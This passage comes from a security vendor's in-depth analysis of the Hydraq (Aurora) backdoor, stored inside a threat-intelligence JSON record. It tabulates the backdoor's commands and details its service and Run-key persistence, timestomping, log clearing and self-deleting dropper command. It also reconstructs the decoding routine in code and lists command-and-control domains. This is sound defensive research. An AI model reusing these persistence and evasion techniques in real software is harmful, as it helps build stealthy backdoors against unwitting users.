following: 1. Connect to a client. 2. Downloads an arbitrary file. 3. Save it as %Temp%\\mdm.exe 4. Execute the downloaded file, else delete the file.|\n||Other value (Task 0x01 or more)|Receive further commands.|\n|Command 0x03|Task 0x00|Enumerate sub keys of a registry key and send the information back to the client.|\n||Task 0x01|Enumerate values of a registry key and send the information back to the client.|\n||Task 0x02|Delete registry values and send back the deleted information to remote server|\n||Task 0x03|Delete registry keys with conditions. The conditions are based on the value of specified registry key.|\n||Task 0x04|Set registry values with conditions. The conditions are based on the value of specified registry key.|\n||Task 0x05|Set registry values without conditions.|\n||Task 0x06|Delete registry keys and send the deleted information back to the remote server.|\n||Task 0x07|Create registry entries with conditions. (Create, set registry value or delete registry key) . The condition is based on the value of specified registry key.|\n||Task 0x08|Create registry keys without condition.|\n||Other value (Task 0x09 or more)|Receive further commands.|\n|Command 0x04|Task 0x00|Retrieve information about all logical drives, volume information, disk space and drive type. Sends the gathered information to the client.|\n||Task 0x01|Checks if a file exists.|\n||Task 0x02|Execute or open a file.|\n||Task 0x03|Copy the file to another location.|\n||Task 0x04|Delete a directory or file.|\n||Task 0x05|Move a file location.|\n||Task 0x06|Modify file attributes.|\n||Task 0x07|Search directory and send all filenames to client.|\n\n\nCA ISBU ISI WHITE PAPER IN DEPTH ANALYSIS OF HYDRAQ 22\n\n\n-----\n\n|Col1|Task 0x08|Create a thread to perform the following: 1. Create a client specified file. 2. Connect to a client 3. Receive data to be used as file content. 4. Write data to file|\n|---|---|---|\n||Task 0x09|Create a thread to perform the following: 1. Get the CRC hash value of the specified file 2. Retrieve the value in the registry key HKLM\\Software\\Sun\\IsoTp 3. Send the data to the client 4. Read the specified file content 5. Send the data to the client|\n||Other value (Task 0x0a or more)|Receive further commands.|\n|Command 0x05|Task 0x00|There is no routine for Task 00.|\n||Task 0x01|Force shutdown of the system.|\n||Task 0x02|Force reboot of the system.|\n||Task 0x03|Delete the current malware registry service. It verifies and removes the registry key if the service name is registered in HKLM \\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SvcHost \\netsvc. Move the file %Temp%\\c_1758.nls to another directory.|\n||Task 0x04|There is no routine for Task 04.|\n||Task 0x05|Clears the “Application” event logs.|\n||Task 0x06|Get file size and CRC value, then send back to the remote server.|\n||Task 0x07|There is no routine for Task 07.|\n||Task 0x08|Modify registry configuration “AppleTlk” found in HKLM\\Software \\Sun\\1.1.2 information based on decrypted resource file.|\n||Task 0x09|Modify registry configuration “IsoTp” found in HKLM\\Software\\Sun \\1.1.2, information based on decrypted resource file.|\n||Other value (Task 0x0a or more)|Receive further commands.|\n|Command 0x06|Task 0x00|There is no routine for Task 00.|\n||Task 0x01|Create a thread to perform the following: 1. Search file with conditions (date time created). 2. Send file to remote server|\n||Task 0x02|Sends header data with the following values: 9 0 0 0 2 0 0 0 0 0 0 0 0 0 0 0 0 0 XX 0x00 = 0x0009; 0x04 = 0x0002; 0x08 = 0x0000; 0x0C = 0x0000; 0x10 = 0x00 0x12 = 0xXX (encryption key)|\n||Other value (Task 0x03 or more)|Receive further commands.|\n|Command 0x07|Task 0x00 - 0x0a|Receive further commands.|\n\n\nCA ISBU ISI WHITE PAPER IN DEPTH ANALYSIS OF HYDRAQ 23\n\n\n-----\n\n|Col1|Task 0x0b|Create a thread to perform the following: 1. Load the library file %system%\\acelpvc.dll. 2. Check for the presence of %system%\\VedioDriver.dll. If not found, download the file from the server and modify the time attributes to be the same as legitimate system file.|\n|---|---|---|\n||Other value (Task 0x0c or more)|Receive further commands.|\n|Command 0x08|Task 0x00|Sends header data in this format: C 0 0 0 0 0 0 0 1 0 0 0 0 0 0 0 0 0 XX 0x00 = 0x000C; 0x04 = 0x0000; 0x08 = 0x1000; 0x0C = 0x0000; 0x10 = 0x00 0x12 = 0xXX (encryption key)|\n||Other value (Task 0x01 or more)|Receive further commands.|\n|Command 0x09|Task 0x00|There is no routine for Task 00.|\n||Task 0x01|Read the information in the file %system%\\drivers\\etc\\networks.ics and send the content to the remote server.|\n||Task 0x02|Delete the file %system%\\drivers\\etc\\network.ics.|\n||Other value (Task 0x03 or more)|Receive further commands.|\n\n\n[Table 06 - Backdoor Command and Task Descriptions]\n\n###### 3.9 Backdoor Commands In Action\n\n_“Primary goal of the attackers was accessing the Gmail accounts of Chinese human rights activist”_\n\n_- statement published in a Google blog post entitled “A new approach to China”._\n\nMalware designed for spying and obtaining sensitive information must have the following offensive\ncapabilities:\n\n1. Probing - the act of searching, exploring, and investigating.\n2. Exfiltration of sensitive information.\n3. Surveillance - the ability to capture images, audio and/or video.\n4. Covert Communication Channel - is a hidden communication embedded into the header and/\nor payload of an overt communication channel to avoid discovery of on-going attacks over the\nnetwork.\n5. Covering Tracks - the ability to stay undetected and avoid forensic discovery.\n\nLet’s summarize and see what we have learned and discovered from Hydraq’s code.\n\nCA ISBU ISI WHITE PAPER IN DEPTH ANALYSIS OF HYDRAQ 24\n\n\n-----\n\n3.9.1 Probing and exfiltration of sensitive information\n\nThe Windows Registry is the heart of the Windows Operating System. It stores users profile, installed applications, privileges for applications and folders, hardware profiles, current logged-on\ninformation, mounted devices, the MRU list, wireless network information, LAN computers and\npasswords[ [10]].\n\nUsing `Command 0x03 Task 0x00 and Task 0x01, a remote attacker using` _Hydraq_ can sub\nstantially extract useful information from Windows Registry.\n\n`Command 0x03` `Task 0x00` Enumerate sub keys of a registry key and send the information back to\nthe client.\n\n`Task 0x01` Enumerate values of a registry key and send the information back to the client.\n\nUsing Command 0x01 Task 0x00, a remote attacker using Hydraq can find out the services that\n\nare available on the compromised system. Windows services display what type of connections is\navailable that attackers can take advantage of to administer further attacks.\n\n`Command 0x01` `Task 0x00` Enumerate service configuration and sends back to the client.\n\nUsing `Command 0x04 Task 0x00, a remote attacker using` _Hydraq can determine all logical_\n\ndrives and if the disk drive is a removable, fixed, CD-ROM, or network drive. (see Backdoor Command Reference Listing 13 for the captured communication of client-server)\n\nThe attacker can then execute `Command 0x04 Task 0x07 to search a directory or` `Command`\n```\n0x06 Task 0x01 to search a file.\n\n```\n`Command 0x04` `Task 0x00` Retrieves information about all logical drives, volume information, disk space\n\nand drive type. It then sends the gathered information to the client.\n\n`Task 0x07` Searches the directory and sends all filenames to client.\n\n`Command 0x06` `Task 0x01` Creates a thread to perform the following:\n\n1. Search a file with conditions (date time created).\n\n2. Send the file to remote server\n\nThrough `Command 0x03, a remote attacker using` _Hydraq can manipulate the registry and use_\n```\nCommand 0x05 Task 09 to store and update gathered information. Command 04 Task 09\n\n```\nretrieves the stored information and assures the integrity of the file sent to remote attacker.\n\nThe backdoor can retrieve any file and information at anytime using Command 0x06 Task 01.\n\nCA ISBU ISI WHITE PAPER IN DEPTH ANALYSIS OF HYDRAQ 25\n\n|Command 0x03|Task 0x00|Enumerate sub keys of a registry key and send the information back to the client.|\n|---|---|---|\n||Task 0x01|Enumerate values of a registry key and send the information back to the client.|\n\n|Command 0x01|Task 0x00|Enumerate service configuration and sends back to the client.|\n|---|---|---|\n\n|Command 0x04|Task 0x00|Retrieves information about all logical drives, volume information, disk space and drive type. It then sends the gathered information to the client.|\n|---|---|---|\n||Task 0x07|Searches the directory and sends all filenames to client.|\n\n|Command 0x06|Task 0x01|Creates a thread to perform the following: 1. Search a file with conditions (date time created). 2. Send the file to remote server|\n|---|---|---|\n\n\n-----\n\n_Hydraq reads the contents of network.ics using_ `Command 0x09 Task 0x01. Network.ics con-`\n\ntains information including network name and number mapping for local area network.\n\n`Command 0x09` `Task 0x01` Reads 616 bytes (0x268) of information stored in the file %system%\\drivers\n\n\\etc\\networks.ics and sends the content to the remote server.\n\nThe attacker can manipulate the routing table to redirect traffic to the compromised system. The\n```\nCommand 0x04 Task 0x02 can be used to open or execute a file or program, and Command\n0x04 Task 0x08 can be use to update network.ics content.\n\n```\nThus, it can perform a _man-in-the-middle attack, where attacker can intercept traffic and capture_\ninformation.\n\n3.9.2 Surveillance\n\n_Hydraq probing capabilities can determine whether the compromised machine has audio/video en-_\nabled applications and devices (for example instant messengers and webcam connection). The\nattacker can use available application and devices to capture images, voice and video for surveillance.\n\nHowever, as discussed earlier, Hydraq can also initiate a real-time graphical control and watch a\nuser’s desktop using `Command 0x07 Task 0x0B (see Appendix D for discussion of acelpvc.dll`\n\nand VedioDriver.dll installation).\n\n3.9.3 Covert Communication\n\nAs discussed, _Hydraq’s client-server uses port 443 as an overt communication channel[1]_ (see\nBackdoor Communication Protocol) and embeds a custom header (see Appendix B showing the\ninitial handshake header) to avoid discovery of on-going attacks over the network.\n\n3.9.4 Covering Tracks\n\nCovering tracks is important in hacking. It extends or allows the attacker to stay undetected for a\nlong period of time. It also removes evidence of hacking and lessens the chances of identification.\n\nIf Hydraq can escalate privileges it can also adjust them; if it can execute and run any program/\napplication, it can terminate it. It can remove its traces in services, registry, file/s, folder/s, change\nfile attributes and move file/s into different locations. It can also force shutdowns or reboot the system, which can remove valuable traces in memory to avoid digital forensics discovery.\n\nFurthermore, in `Command 0x04 Task 0x02` the remote attacker can clear Application Event\n\nlogs.\n\n1 Overt channel is any communication path for the authorized data transmission within a computer system or network. HTTP\n\nand HTTP SSL is an overt channel.\n\nCA ISBU ISI WHITE PAPER IN DEPTH ANALYSIS OF HYDRAQ 26\n\n|Command 0x09|Task 0x01|Reads 616 bytes (0x268) of information stored in the file %system%\\drivers \\etc\\networks.ics and sends the content to the remote server.|\n|---|---|---|\n\n\n-----\n\n|Command 0x05|Task 0x05|Clears the “Application” event logs.|\n|---|---|---|\n\n\n3.9.5 Expandable Features\n\nIn `Command 0x02 Task 0x00, the remote attacker can download and execute arbitrary files`\n\nonto compromised systems, and it can adjust process token privileges using `Command 0x00`\n```\nTask 0x00. This sets of commands further expands the capability of the attacks.\n\n```\n`Command 0x02` `Task 0x00` Execute a new thread to perform the following:\n\n1. Connect to the client.\n\n2. Downloads an arbitrary file.\n3. Save it as %Temp%\\mdm.exe\n\n4. Execute the downloaded file, else delete the file.\n\n`Command 0x00` `Task 0x00` Adjust Token Privilege / Access Privilege Escalation and Enumerate Process.\n\nThe backdoor configuration that is stored in the registry can be updated using Command 05 Task\n```\n0x08. This means that the remote attacker can modify and change the connection details at any\n```\ntime.\n\nCA ISBU ISI WHITE PAPER IN DEPTH ANALYSIS OF HYDRAQ 27\n\n|Command 0x02|Task 0x00|Execute a new thread to perform the following: 1. Connect to the client. 2. Downloads an arbitrary file. 3. Save it as %Temp%\\mdm.exe 4. Execute the downloaded file, else delete the file.|\n|---|---|---|\n\n|Command 0x00|Task 0x00|Adjust Token Privilege / Access Privilege Escalation and Enumerate Process.|\n|---|---|---|\n\n\n-----\n\n# Summary\n\nThe discovery of Hydraq allowed us to explore and understand the underlying features of a highly\nsophisticated means of attack. It takes time, organization, skill, and resources to successfully deploy coordinated attacks against high profile infrastructures such as Google.\n\nClearly, the increasing wealth of information stored in the cloud[2] is becoming an attractive target.\nThe emerging world of cyberspace is now at war against cybercriminals and those conducting cyberwarfare[ [7] [8]]. Sophisticated attacks exploiting unknown software vulnerabilities as means of entry point provides an advantage for attackers to silently infiltrate and perform various forms of spying including the ability to deploy video and audio surveillance, and the probing and stealing of\nsensitive desired information. _Hydraq’s communication protocol is carefully crafted and re-_\nsearched making it difficult to detect and recognize an on-going attack over the network. The level\nof detail of the backdoor commands allow a remote attacker to perform the necessary tasks using\na smaller resource footprint.\n\nIn conclusion, the emergence of this type of sophisticated offensive capability will continue to pose\nchallenges for cyberspace security defenses. By exposing the intricate details of Hydraq, we hope\nto assist and contribute to overall cyber security learning and awareness.\n\n2 Cloud refers to services accessed and stored on the internet cloud. Take note, Google disclosed that attackers accessed\n\ntwo Gmail accounts of Chinese human rights activist. [1]\n\nCA ISBU ISI WHITE PAPER IN DEPTH ANALYSIS OF HYDRAQ 28\n\n\n-----\n\n# Safe Computing Habits\n\nWith the proliferation of Web-based attacks vector and the increase in global Internet usage, it is\nmore important than ever to be cautious to ensure safety online. Security is a process. To be secure, you must be aware, apply the right technology, understand your daily computing activity and\nidentify the amount of information or data you want to secure.\n\n###### Let the Technology Work For You\n\nHere are some easy steps and reminder to ensure that your CA security products provides optimal\nprotection for you.\n\n1. Your security scanner must be always turned on and up-to-date with the latest signature. Real\ntime scanning protects you from possible infection that you may get from compromised Websites, network shares, email and flash drives.\n\n2. Turn on your firewall. Your firewall provides a different layer of security that guards you from\n\nnetwork attacks and blocks unauthorized access to your machine. A firewall with real-time malware behavior intrusion detection could prevent or lessen the impact of malware infection.\n\n3. Turn on Data Execution Prevention (DEP). This feature is available in Windows XP SP3, Win\ndows Server 2003, Windows Server 2008, Windows Vista and Windows 7. Refer Microsoft instruction on how to configure memory protection in Windows XP SP 2 at\n[http://technet.microsoft.com/en-us/library/cc700810.aspx](http://technet.microsoft.com/en-us/library/cc700810.aspx)\n\n4. Increase your browser security settings. You can refer CERT Web browser security tips at\n\n[http://www.cert.org/tech_tips/securing_browser](http://www.cert.org/tech_tips/securing_browser)\n\n###### Be Security-Aware\n\n1. Do NOT open email from people you don’t know. Think twice and verify before clicking a URL or\n\nopen an attachment. Don’t be click happy! All it takes is a moment of inattention.\n\n2. Implement strong password. Refer to these Microsoft Tips for creating a strong password:\n\n[http://www.microsoft.com/protect/yourself/password/create.mspx](http://www.microsoft.com/protect/yourself/password/create.mspx)\n\n3. When conducting online banking or financial transaction, make sure your browser connection is\n\nsecure.\n\n4. Encrypt online communication and confidential data.\n\n5. Back up your important data. Keep a copy of all your files and store them separately.\n\n6. Be cautious about instant messaging. Avoid chatting with people you don’t know, especially if\n\nthey ask for personal information such as photos or want you to do something for them.\n\n7. Protect your identity while enjoying online social networking activities. Be wary of clicking links or\n\nsuspicious profiles. Double-check the integrity of the connection or friend request before adding\nanyone to your network. Avoid installing extras such as third-party applications; they may lead to\nmalware infection, or attackers could use them to steal your identity.\n\n8. Avoid piracy by downloading from secure sources.\n\nCA ISBU ISI WHITE PAPER IN DEPTH ANALYSIS OF HYDRAQ 29\n\n\n-----\n\n9. Avoid threats that use social engineering techniques by checking user feedback about a Web\n\nsite before visiting it, and reader feedback about an application before installing it.\n\n10. If you are using Adobe PDF Reader, prevent your default browser from automatically opening\n\nPDF document. Refer to our CA Security Advisor research blog entry at\n[http://community.ca.com/blogs/securityadvisor/archive/2009/02/24/attackers-love-zero-day.asp](http://community.ca.com/blogs/securityadvisor/archive/2009/02/24/attackers-love-zero-day.aspx)\n[x](http://community.ca.com/blogs/securityadvisor/archive/2009/02/24/attackers-love-zero-day.aspx)\n\n11. Check for and install security updates regularly.\n\n12. Be careful with search engine results. Read them carefully and check to ensure that the con\ntent relates to your subject before clicking the Web site link.\n\n##### Make Internet computing safe - report suspicious files and Web sites to virus@ca.com\n\nCA ISBU ISI WHITE PAPER IN DEPTH ANALYSIS OF HYDRAQ 30\n\n\n-----\n\n#### Appendix A - Other variant method of installation\n\n1. Enumerates all services with the following characteristics:\n```\n   ServiceType = SERVICE_WIN32\n   ServiceState = 3\n\n```\n2. Searches for services with the SERVICE_RUNNING state or the service name Brower [sic].\n\na.The malware checks the service configuration for the following ImagePatch value:\n```\n       svchost.exe -k netsvcs\n    (It searches for services with this value as a command line parameter)\n\n```\nb. If the ImagePath value is found, it checks the registry key below and retrieves the\n\nvalue of ServiceDll registry entry:\n```\n    HKLM\\SYSTEM\\CurrentControlSet\\Services\\<service name>\\Parameters\n\n```\nc. The malware modifies the service's configuration, modifying the service Start and Type\ncharacteristics to the following:\n```\n      Start - 2 SERVICE_AUTO_START\n      Type - 110    \n          SERVICE_INTERACTIVE_PROCESS|SERVICE_WIN32_OWN_PROCESS\n\n```\nThese service modifications enable the service to start automatically, interact with the desktop, and run in its own process.\n\n3. If Step 2 is successful, the malware performs the following instructions:\n\na. Loads the resource file in memory and writes the resource's content to a file in \"%USER```\n   PROFILE%\\<service name>.dll\".\n\n```\nThis behavior drops the DLL component in the directory,\n```\n   \"%USERPROFILE%\\<service name>.dll\"\n\n```\n_Note: %USERPROFILE% is \"C:\\Documents and Settings\\<username>\"._\n\nb. As part of its anti-forensic discovery, the malware modifies the DLL file time attributes to\nbe the same as kernel32.dll.\n\nThe date created, last accessed, and last modified will be modified in this case.\n\nc. The Hydraq dropper modifies the registry key of the target service:\n```\n    HKLM\\SYSTEM\\CurrentControlSet\\Services\\<service name>\\Parameters\\ServiceDll =\n    \"%USERPROFILE%\\<service name>.dll\"\n\n```\nThis automatically executes the DLL component on system start.\n\nd.The malware starts the target service to execute the DLL component.\n\nCA ISBU ISI WHITE PAPER IN DEPTH ANALYSIS OF HYDRAQ 31\n\n\n-----\n\n4. If Step 2 is NOT successful, the malware performs the following instructions:\n\na. Loads the malware's resource file in memory and writes the resource's content to a file in\n```\n   \"%USERPROFILE%\\<random name>.dll\".\n\n```\nThis behavior drops the DLL component file in the directory \"%USERPROFILE%\\<random\n```\n   name>.dll\"\n\n```\n_Note:_\n```\n   %USERPROFILE% is \"C:\\Documents and Settings\\<username>\".\n   <random characters> is based on the result of GetTickCount API.\n\n```\nb. The malware creates a service with the same name as the generated filename of the\n\nDLL component and with the following characteristics:\n```\n    DesiredAccess = SERVICE_ALL_ACCESS\n    ServiceType = SERVICE_WIN32_OWN_PROCESS|SERVICE_INTERACTIVE_PROCESS\n    StartType = SERVICE_AUTO_START\n    ErrorControl = SERVICE_ERROR_NORMAL\n    BinaryPathName = \"%SystemRoot%\\System32\\svchost.exe -k \"random name\"\"\n    HKLM\\SYSTEM\\CurrentControlSet\\Services\\<random name>\\Type =\n    SERVICE_WIN32_OWN_PROCESS|SERVICE_INTERACTIVE_PROCESS\n    HKLM\\SYSTEM\\CurrentControlSet\\Services\\<random name>\\Start = SERVICE_AUTO_START\n    HKLM\\SYSTEM\\CurrentControlSet\\Services\\<random name>\\ErrorControl = dword:00000001\n    HKLM\\SYSTEM\\CurrentControlSet\\Services\\<random name>\\ImagePath =\n    %SystemRoot%\\System32\\svchost.exe -k \"<random name>\"\n    HKLM\\SYSTEM\\CurrentControlSet\\Services\\<random name>\\DisplayName = \"<random name>\"\n    HKLM\\SYSTEM\\CurrentControlSet\\Services\\<random name>\\ObjectName = \"LocalSystem\"\n    HKLM\\SYSTEM\\CurrentControlSet\\Services\\<random name>\\Description = \"<random name>\"\n    HKLM\\SYSTEM\\CurrentControlSet\\Services\\<random name>\\Parameters\\ServiceDll = \"%US    ERPROFILE%\\<random name>.dll\"\n    HKLM\\SYSTEM\\CurrentControlSet\\Services\\<random name>\\Parameters\\StubPath = <drop    per component filename>\n\n```\nIt also adds the service name in the registry key below so the service will be executed on\nstart as a system service.\n```\n    HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SvcHost\\<random name> = <random\n    name>\n\n```\nc. The malware starts the created service to execute the DLL component.\n\nIf the malware fails to create the service it adds the following registry entry:\n```\n    HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\<random name> = rundll32.exe\n    \"%USERPROFILE%\\<random name>.dll\", Launch\n\n```\nIt then executes the process with the parameters below. If this fails the malware will delete\nthe DLL component file.\n```\n   rundll32.exe \"%USERPROFILE%\\<random name>.dll\", Launch\n\n```\nLastly the malware executes the file cmd.exe with the command line parameters below.\nThe purpose of this is to delete the dropper component.\n```\n    \"%system%\\cmd.exe /c del \"<dropper filename>\" > nul\"\n\n```\nCA ISBU ISI WHITE PAPER IN DEPTH ANALYSIS OF HYDRAQ 32\n\n\n-----\n\n#### Appendix B - Initial Handshake\n\n Appendix C - Customize Character Decoding\n\nResource decryption - Resource size is 0x158.\n\nThe malware does not modify the first 8 bytes of the resource and decodes the remaining\n```\n0x150 bytes using bitwise XOR on the 0x150 byte of the resource with 0x99 as the key. The\n\n```\nfollowing decoding logic is used:\n\nCA ISBU ISI WHITE PAPER IN DEPTH ANALYSIS OF HYDRAQ 33\n\n\n-----\n\n```\n//----->Start decoding code\n    int k = 0; //used for output buffer - decode result\n    for(int i = 0; i < 0x150; i+=4)\n    {\n     for(int j = 0; j < 0x04; j++)\n     {\n      rsrc_buffer[i+j] = rsrc_buffer[i+j] ^ 0x99;\n      if (rsrc_buffer[i+j] >= 0x41 && rsrc_buffer[i+j] =< 0x5A ) //0x41 = 'A' | 0x5A = Z\n      {\n        rsrc_buffer[i+j] = rsrc_buffer[i+j] - 0x41;\n      }\n      else if (rsrc_buffer[i+j] >= 0x61 && rsrc_buffer[i+j] =< 0x7A ) //0x61 = 'a' | 0x7A = 'z'\n      {\n        rsrc_buffer[i+j] = rsrc_buffer[i+j] - 0x47;\n      }\n      else if (rsrc_buffer[i+j] >= 0x30 && rsrc_buffer[i+j] =< 0x39) //0x30 = '0' | 0x39 = '9'\n      {\n        rsrc_buffer[i+j] = rsrc_buffer[i+j] + 0x04;\n      }\n      else if (rsrc_buffer[i+j] == 0x2B) // 0x2B = '+'\n      {\n        rsrc_buffer[i+j] = 0x3E; // 0x3E = '>'\n      }\n      else if (rsrc_buffer[i+j] == 0x2F) // 0x2F = '/'\n      {\n        rsrc_buffer[i+j] = 0x3F; // 0x3F = '?'\n      }\n      else if (rsrc_buffer[i+j] == 0x3D) // 0x2F = '='\n      {\n        rsrc_buffer[i+j] = 0x00;\n      }\n     }//for(int j = 0; j < 0x04; j++)\n     rsrc_buffer[i+1] = rsrc_buffer[i+1] >> 0x04\n     rsrc_buffer[i] = rsrc_buffer[i] << 0x02\n     rsrc_buffer[i+1] = rsrc_buffer[i] | rsrc_buffer[i+1]\n     [rsrc_result + k] = rsrc_buffer[i+1]\n     rsrc_buffer[i+1] = rsrc_buffer[i+1] << 0x04\n     rsrc_buffer[i+2] = rsrc_buffer[i+2] >> 0x02\n     rsrc_buffer[i+2] = rsrc_buffer[i+2] | rsrc_buffer[i+1]\n     rsrc_buffer[i+1] = rsrc_buffer[i+2]\n     rsrc_buffer[i+1] = rsrc_buffer[i+1] << 0x06\n     rsrc_buffer[i+1] = rsrc_buffer[i+1] | rsrc_buffer[i+3]\n     [rsrc_result + k + 1] = rsrc_buffer[i+2]\n     [rsrc_result + k + 2] = rsrc_buffer[i+1]\n     k+=3;\n    } //for(int i = 0; i < 0x150; i+=4)\n//----->End decoding code\n\n```\nCA ISBU ISI WHITE PAPER IN DEPTH ANALYSIS OF HYDRAQ 34\n\n\n-----\n\n#### Appendix D - Real-time Graphical Control\n\nThe Hydraq backdoor client can initiate real-time graphical control through the installation of Virtual Network Computing (VNC). Based on the malware code, the VNC DLL component can be\ninstalled in this sequence:\n\n1. Client sends Command 0x04 Task 0x08 to upload the file acelpvc.dll.\n\n2. Client initiates Command 0x07 Task 0x0B.\n\na. Get the file attributes of the file %System%\\acelpvc.dll,\n\ncheck if it is directory or file,\nexit if its a directory.\nb. Get address of acelpvc.dll’s export function “EntryMain”\n\nc. Get the file attribute of the file %System%\\VedioDriver.dll,\ncheck if it is directory or file,\nexit if its a directory.\n\n3.1 If %System%\\VedioDriver.dll exists,\n\na. Load acelpvc.dll in the memory space of the malware.\nb. Execute acelpvc.dll’s EntryMain export function with the server IP address and port\n\nas the parameter. The client is expected to have a VNC client to receive the framebuffer[ [9]] from the server.\n\n3.2 If %System%\\VedioDriver.dll does NOT exist,\n\na. Contact the client to download VedioDriver.dll\nb. The Server receives VedioDriver.dll from the client.\n\nc. Verify the CRC value of the created file from the server, and delete if it is different.\nd. Modify the file’s date and time attributes to be the same as the system file,\n```\n    user32.dll.\n\n```\n[Appendix D Figure 01 - Acelpvc.dll list of APIs used in the Import Table]\n\nCA ISBU ISI WHITE PAPER IN DEPTH ANALYSIS OF HYDRAQ 35\n\n\n-----\n\n[Appendix D Figure 02 - VedioDriver.dll Export Functions]\n\n#### Appendix E - Domain Name List\n\n  - 360.homeunix.com\n\n  - [www.ccmp1.com](http://www.ccmp1.com)\n\n  - blog1.servebeer.com\n\n  - sl1.homelinux.org\n\n  - update.ourhobby.com\n\n  - ftp2.homeunix.com\n\n###### Complete List as published at http://www.security.nl/files/aurorafiles.txt\n\n  - 69.164.192.4\n\n  - alt1.homelinux.com\n\n  - amt1.homelinux.com\n\n  - aop1.homelinux.com\n\n  - app1.homelinux.com\n\n  - blogspot.blogsite.org\n\n  - filoups.info\n\n  - ftpaccess.cc\n\n  - google.homeunix.com\n\n  - members.linode.com\n\n  - tyuqwer.dyndns.org\n\n  - voanews.ath.cx\n\n  - webswan.33iqst.com:4000\n\n  - yahoo.8866.org\n\n  - ymail.ath.cx\n\n  - yahooo.8866.org\n\n  - connectproxy.3322.org\n\n  - csport.2288.org\n\nCA ISBU ISI WHITE PAPER IN DEPTH ANALYSIS OF HYDRAQ 36\n\n\n-----\n\n#### Reference\n\n[1] [http://googleblog.blogspot.com/2010/01/new-approach-to-china.html](http://googleblog.blogspot.com/2010/01/new-approach-to-china.html)\n\n[2] [http://www.state.gov/secretary/rm/2010/01/135519.htm](http://www.state.gov/secretary/rm/2010/01/135519.htm)\n\n[3] [http://www.dni.gov/testimonies/20100202_testimony.pdf](http://www.dni.gov/testimonies/20100202_testimony.pdf)\n\n[4] [http://www.scribd.com/doc/13731776/Tracking-GhostNet-Investigating-a-Cyber-Espionage-Network](http://www.scribd.com/doc/13731776/Tracking-GhostNet-Investigating-a-Cyber-Espionage-Network)\n\n[5] [http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-0249](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-0249)\n\n[6] [http://www.microsoft.com/technet/security/Bulletin/MS10-002.mspx](http://www.microsoft.com/technet/security/Bulletin/MS10-002.mspx)\n\n[7] [http://en.wikipedia.org/wiki/Cyberwarfare](http://en.wikipedia.org/wiki/Cyberwarfare)\n\n[8] Inside CyberWarfare by Jeffrey Carr [http://oreilly.com/catalog/9780596802165](http://oreilly.com/catalog/9780596802165)\n\n[9] [http://en.wikipedia.org/wiki/Framebuffer](http://en.wikipedia.org/wiki/Framebuffer)\n\n[10] [http://www.forensicfocus.com/downloads/windows-registry-quick-reference.pdf](http://www.forensicfocus.com/downloads/windows-registry-quick-reference.pdf)\n\nCA ISBU ISI WHITE PAPER IN DEPTH ANALYSIS OF HYDRAQ 37\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "d63ae2b7-445f-460d-965d-2676dacdb6de",
            "created_at": "2022-10-25T15:59:19.552139Z",
            "updated_at": "2022-10-25T15:59:19.552139Z",
            "deleted_at": null,
            "name": "APTnotes",
            "url": "https://github.com/aptnotes/data",
            "description": "APTnotes data",
            "reports": null
        },
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        },
        {
            "id": "99593a68-7f6e-400e-9a9f-a707f66d2e72",
            "created_at": "2022-11-23T11:07:14.353321Z",
            "updated_at": "2022-11-23T11:07:14.353321Z",
            "deleted_at": null,
            "name": "AGRO",
            "url": "https://apt.threattracking.com",
            "description": "APT Groups and Operations Spreadsheet",
            "reports": null
        }
    ],
    "references": [
        "https://app.box.com/s/44e7rbs177n5inhpm9si6gu3lm7fw6bj",
        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/2010/2010.03.14.Hydraq/in-depth_analysis_of_hydraq_final_231538.pdf",
        "http://cybercampaigns.net/wp-content/uploads/2013/05/Hydraq.pdf"
    ],
    "report_names": [
        "in-depth_analysis_of_hydraq_final_231538",
        "Hydraq.pdf"
    ],
    "threat_actors": [
        {
            "id": "3cc6c262-df23-4075-a93f-b496e8908eb2",
            "created_at": "2022-10-25T16:07:23.682239Z",
            "updated_at": "2025-03-27T02:02:09.920109Z",
            "deleted_at": null,
            "main_name": "GhostNet",
            "aliases": [
                "GhostNet",
                "Snooping Dragon"
            ],
            "source_name": "ETDA:GhostNet",
            "tools": [
                "AngryRebel",
                "Farfli",
                "Gh0st RAT",
                "Gh0stnet",
                "Ghost RAT",
                "Ghostnet",
                "Moudour",
                "Mydoor",
                "PCRat",
                "Remosh",
                "TOM-Skype"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
            "created_at": "2022-10-25T16:07:23.773944Z",
            "updated_at": "2025-03-27T02:02:09.974695Z",
            "deleted_at": null,
            "main_name": "Lead",
            "aliases": [
                "Casper",
                "TG-3279"
            ],
            "source_name": "ETDA:Lead",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "RbDoor",
                "RibDoor",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "e91dae30-a513-4fb1-aace-4457466313b3",
            "created_at": "2023-01-06T13:46:38.974913Z",
            "updated_at": "2025-03-27T02:00:02.967085Z",
            "deleted_at": null,
            "main_name": "GhostNet",
            "aliases": [
                "Snooping Dragon"
            ],
            "source_name": "MISPGALAXY:GhostNet",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "f8dddd06-da24-4184-9e24-4c22bdd1cbbf",
            "created_at": "2023-01-06T13:46:38.626906Z",
